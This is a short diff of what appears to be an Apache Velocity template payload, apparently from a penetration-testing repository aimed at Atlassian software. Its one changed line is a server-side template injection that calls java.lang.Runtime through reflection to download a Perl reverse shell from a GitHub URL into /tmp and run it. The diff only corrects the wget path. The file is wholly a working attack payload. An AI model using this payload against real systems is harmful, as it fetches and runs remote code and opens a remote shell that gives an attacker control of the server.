@@ -1,2 +1,2 @@
 #set($e="e")
-$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("/bin/wget https://raw.githubusercontent.com/codewatchorg/testingatlass/master/perl-reverse-shell.pl -O /tmp/perl-reverse-shell.pl && /bin/perl /tmp/perl-reverse-shell.pl")
+$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("/usr/bin/wget https://raw.githubusercontent.com/codewatchorg/testingatlass/master/perl-reverse-shell.pl -O /tmp/perl-reverse-shell.pl && /bin/perl /tmp/perl-reverse-shell.pl")
